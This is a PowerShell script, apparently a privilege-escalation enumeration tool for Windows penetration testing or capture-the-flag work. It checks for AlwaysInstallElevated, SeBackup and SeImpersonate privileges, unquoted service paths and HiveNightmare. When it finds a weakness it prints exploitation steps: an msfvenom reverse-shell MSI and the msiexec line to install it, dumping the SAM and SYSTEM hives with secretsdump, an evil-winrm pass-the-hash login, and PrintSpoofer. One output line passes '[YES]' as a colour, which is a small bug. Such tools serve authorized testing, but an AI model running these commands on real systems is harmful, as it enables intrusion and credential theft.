function UserInformation {
    <#
    .DESCRIPTION
        This function provides information about users and their access rights on the system.
    #>

    # Checking the system language
    $systemLanguage = (Get-Culture).Name

    # Define array for group names depending on system language
    if ($systemLanguage -eq "de-DE") {
        $groupNames = @("Administratoren", "Benutzer", "Sicherungs-Operatoren")
    } else {
        $groupNames = @("Administrators", "Users", "Backup Operators")
    }

    # Outputting group information
    $groupNames | ForEach-Object {
        Write-Host $_
        Write-Host "-------"
        Start-Process net -ArgumentList "localgroup $_" -Wait -NoNewWindow
    }
    
    # Directory access check
    Get-ChildItem C:\Users\* | ForEach-Object {
        if (Get-ChildItem $_.FullName -ErrorAction SilentlyContinue) {
            Write-Host -ForegroundColor Red "Read Access to $($_.FullName)"
        }
    }
}

function NetAccountsInfo {
    net accounts
}

function RemoteSessions {
    try { 
        qwinsta

        Write-Host ""
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " ..."
    } catch {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " 'qwinsta' command not present on system."
    }
}

function CurrentSessions {
    try { 
        quser

        Write-Host ""
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " ..."
    } catch {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " 'quser' command not present on system."
    }
}

function Get-RegistryValue {
    param (
        [string]$path,
        [string]$name
    )

    try {
        $value = Get-ItemProperty -Path $path -Name $name -ErrorAction Stop
        return $value.$name
    } catch {
        return 0
    }
}

function AlwaysInstallElevated {
    <#
    .DESCRIPTION
        Check for AlwaysInstallElevated. If activated, any user can install .msi.
    #>
    # Read registry values
    $hkcuPath = 'Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer'
    $hkcuValue = Get-RegistryValue -path $hkcuPath -name 'AlwaysInstallElevated'

    $hklmPath = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer'
    $hklmValue = Get-RegistryValue -path $hklmPath -name 'AlwaysInstallElevated'

    # Print out values
    Write-Output "HKCU = $hkcuValue"
    Write-Output "HKLM = $hklmValue"

    # If both are 1 = vulnerable
    if ($hkcuValue -eq 1 -and $hklmValue -eq 1) {
        Write-Host -ForegroundColor Green "[YES]" -NoNewline
        Write-Host " system is vulnerable to AlwaysInstallElevated."

        Write-Host ""
        Write-Host "Use: msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f msi > something.msi"
        Write-Host "Then Use: msiexec /quiet /qn /i something.msi"
        Write-Host "Remove it again: msiexec /q /n /uninstall something.msi"
    } else {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " system is NOT vulnerable to AlwaysInstallElevated."
    }
}

function SeBackUpPrivilege {
    <#
    .DESCRIPTION
        The SeBackupPrivilege is a Windows privilege that provides a user or process with the ability to read files and directories, regardless of the security settings on those objects. 
        This privilege can be used by certain backup programs or processes that require the capability to back up or copy files that would not normally be accessible to the user.
    #>
    
    $userInformation = whoami /priv
    if($userInformation -like "*SeBackUpPrivilege*") {
        Write-Host -ForegroundColor Green "[YES]" -NoNewline
        Write-Host " SeBackUpPrivilege for current account found. Check if enabled."
        $userInformation -split "`n" | Where-Object {$_ -like "*SeBackUpPrivilege*"} | ForEach-Object {Write-Host $_}

        Write-Host ""
        Write-Host "Use: mkdir C:\temp ; reg save hklm\sam C:\temp\sam.hive ; reg save hklm\system C:\temp\system.hive"
        Write-Host "Or Use: impacket-secretsdump -sam sam.hive -system system.hive LOCAL"
        Write-Host "Then: evil-winrm -i <ip> -u 'Administrator' -H '<hash>'"
    } else {
        Write-Host -ForegroundColor Red "[NO]" -NoNewline
        Write-Host " No SeBackUpPrivilege for current account found."
    }
}

function SeImpersonatePrivilege {
    <#
    .DESCRIPTION
        The SeImpersonatePrivilege is a Windows privilege that grants a user or process the ability to impersonate the security context of another user or account. 
        This privilege allows a process to assume the identity of a different user, enabling it to perform actions or access resources as if it were that user.
    #>

    $userInformation = whoami /priv
    if($userInformation -like "*SeImpersonatePrivilege*") {
        Write-Host -ForegroundColor Green "[YES]" -NoNewline
        Write-Host " SeImpersonatePrivilege for current account found. Check if enabled."
        $userInformation -split "`n" | Where-Object {$_ -like "*SeImpersonatePrivilege*"} | ForEach-Object {Write-Host $_}

        Write-Host ""
        Write-Host "Use: https://github.com/itm4n/PrintSpoofer => PrintSpoofer64.exe -i -c cmd"
    } else {
        Write-Host -ForegroundColor Red "[NO]" -NoNewline
        Write-Host " No SeImpersonatePrivilege for current account found."
    }
}

function UnquotedServicePath {
    Write-Host -ForegroundColor YELLOW "[INFO]" -NoNewline
    Write-Host " Fetching the list of services, this may take a while...";
    $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -inotmatch "`"" -and $_.PathName -inotmatch ":\\Windows\\" -and ($_.StartMode -eq "Auto" -or $_.StartMode -eq "Manual") -and ($_.State -eq "Running" -or $_.State -eq "Stopped") };
    if ($($services | Measure-Object).Count -lt 1) {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " No unquoted service paths were found";
    }
    else {
        $services | ForEach-Object {
        Write-Host -ForegroundColor "[YES]" -NoNewline
        Write-Host " Unquoted Service Path found!"
        Write-Host Name: $_.Name
        Write-Host PathName: $_.PathName
        Write-Host StartName: $_.StartName 
        Write-Host StartMode: $_.StartMode
        Write-Host Running: $_.State
        } 
    }
}

function HiveNightmare {
    <#
    .DESCRIPTION
        HiveNightmare (CVE-2021-36934) allows you to retrieve all registry hives (SAM, SECURITY, SYSTEM) in Windows 10 & Windows 11
        as a non-administrator user.
    #>

    try {
        $samPath = "C:\Windows\System32\config\SAM"

        # Check permissions using Get-Acl
        $acl = Get-Acl -Path $samPath -ErrorAction Stop

        $accessGranted = $false
        foreach ($access in $acl.Access) {
            if ($access.IdentityReference -match "BUILTIN\\Users" -and $access.FileSystemRights -match "Read") {
                $accessGranted = $true
                break
            }
        }

        if ($accessGranted) {
            Write-Host -ForegroundColor Green "[YES]" -NoNewline
            Write-Host " Non-Administrator have some access."
        } else {
            Write-Host -ForegroundColor Red "[NO]" -NoNewline
            Write-Host " Non-Administrator have no access."
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Host -ForegroundColor Red "[NO]" -NoNewline
        Write-Host " Non-Administrator have no access."
    }
    catch {
        Write-Host -ForegroundColor Cyan "[INFO]" -NoNewline
        Write-Host " Something went wrong: $_"
    }
}
